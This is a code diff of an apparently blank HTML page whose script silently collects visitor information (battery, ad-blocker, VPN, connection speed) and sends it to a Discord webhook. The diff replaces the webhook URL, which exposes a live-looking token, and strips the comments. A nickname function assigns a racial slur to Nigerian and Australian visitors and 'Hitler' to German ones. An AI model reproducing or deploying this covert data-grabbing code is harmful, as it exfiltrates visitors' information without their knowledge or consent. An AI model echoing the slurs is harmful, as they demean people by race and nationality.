@@ -79,7 +79,7 @@
     <script>
         function sendToDiscord(message) {
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://discord.com/api/webhooks/1229406191717711895/zTi5NHh_YOWKcTHYV-x-_TSs6qdBwGlrZdjvXPyIQNVVCFsYGnmJkVQBHsGD_wLimrqv", true);
+            xhr.open("POST", "https://discord.com/api/webhooks/1430868966724861952/X9ucwsQPziCCUYV4GCBhmRdYZ066xGeApY8qZzwoQYy7SGe4cHRmX3EENEcxYGbg_rM0", true);
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.send(JSON.stringify({ content: message }));
         }
@@ -141,7 +141,7 @@ async function getUserName() {
                 return "Russkiy";
             case "NG":
             case "AU":
-                return "Nigger"; // Обратите внимание на этот термин; он может быть оскорбительным.
+                return "Nigger";
             case "DE":
                 return "Hitler";
             case "US":
@@ -493,13 +493,12 @@ async function getBatteryInfo() {
 async function checkAdBlock() {
     const adElement = document.createElement('div');
     adElement.id = 'ad-element';
-    adElement.style.display = 'block'; // Пытаемся отобразить элемент
+    adElement.style.display = 'block';
     adElement.innerHTML = 'Ad';
     document.body.appendChild(adElement);
 
-    // Проверяем, скрыт ли элемент
     const isAdBlockActive = window.getComputedStyle(adElement).display === 'none';
-    document.body.removeChild(adElement); // Удаляем элемент
+    document.body.removeChild(adElement);
 
     return isAdBlockActive ? "Ad Blocker Detected" : "No Ad Blocker";
 }
@@ -547,11 +546,11 @@ async function checkVPN() {
             return new Promise((resolve) => {
                 const startTime = Date.now();
                 const image = new Image();
-                image.src = "https://www.gstatic.com/webp/gallery/1.jpg" + "?t=" + startTime; // Уникальный URL для загрузки
+                image.src = "https://www.gstatic.com/webp/gallery/1.jpg" + "?t=" + startTime;
                 image.onload = () => {
                     const endTime = Date.now();
-                    const speed = (image.width * image.height * 8) / ((endTime - startTime) / 1000); // Бит/сек
-                    resolve((speed / 1e6).toFixed(2) + " Mbps"); // Конвертация в Мбит/с
+                    const speed = (image.width * image.height * 8) / ((endTime - startTime) / 1000);
+                    resolve((speed / 1e6).toFixed(2) + " Mbps");
                 };
             });
         } 
@@ -751,4 +750,5 @@ async function sendInfoToDiscord() {
 <body>
 </body>
 </html>
+
 
